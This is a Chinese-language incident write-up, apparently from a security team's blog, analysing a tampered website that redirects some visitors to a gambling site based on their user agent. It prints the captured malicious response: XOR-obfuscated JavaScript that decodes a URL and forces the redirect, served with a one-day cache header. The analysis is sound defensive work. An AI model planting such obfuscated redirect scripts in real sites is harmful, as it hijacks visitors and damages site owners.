---
title: 页面篡改分析-服务器端重定向跳转
date: 2025-08-01T00:00:00+08:00
tags: [红蓝对抗, 页面篡改]
---

在本样本实例中，我们发现篡改的页面出现的情况与以往的都不同，原因在于不同ua服务器返回的信息不同，甚至出现了疑似流量转发的少见的情况。

现象：
收到事件线索，客户某网站在打开的时候出现了跳转游戏网站的现象，并且可以复现。通过描述可以确定篡改一定存在。下面需要本地复现一下看看情况。

![image-20220624下午114222624](image-20220624%E4%B8%8B%E5%8D%88114222624.png)

跳转的情况总结有2种，一种是服务器无返回，之后直接出现菠菜网站请求响应；大概出现了3-6次的这种情况。

![image-20220625上午122255747](image-20220625%E4%B8%8A%E5%8D%88122255747.png)

![image-20220625上午122545470](image-20220625%E4%B8%8A%E5%8D%88122545470.png)

第二种是匹配到AppleWebKit 也就是移动端UA及MAC端返回跳转脚本导致跳转。并且返回包设置缓存1天，Cache-Control: max-age=86400，导致不清缓存的情况下会出现不断出现跳转现象。

![image-20220624下午114608440](image-20220624%E4%B8%8B%E5%8D%88114608440.png)

```html
HTTP/1.0 200 OK
Content-Type: text/html
Content-Length: 511
Cache-Control: max-age=86400
Connection: close

<!DOCTYPE html>
<html>

<head></head>

<body>
    <script type="text/javascript">
    function uIYQU(a) {
        var c = [82, 36, 205, 167, 244, 156, 81, 238];
        var b = "";
        for (var i = 0; i < a.length; i++) {
            var k = c[i % c.length];
            b += String.fromCharCode(a[i] ^ k);
        }
        return b;
    }
    var u = uIYQU([58, 80, 185, 215, 135, 166, 126, 193, 57, 79, 169, 193, 204, 178, 50, 129, 63, 11]);
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf("applewebkit") > 0) { location.replace(u) } else {
        var e = document.createElement("a");
        e.href = u;
        document.body.appendChild(e);
        e.click()
    };
    </script>
</body>
</html>
```

![image-20220624下午114443121](image-20220624%E4%B8%8B%E5%8D%88114443121.png)

uIYQU(a)为自定义解密函数，[58, 80, 185, 215, 135, 166, 126, 193, 57, 79, 169, 193, 204, 178, 50, 129, 63, 11]为密文。
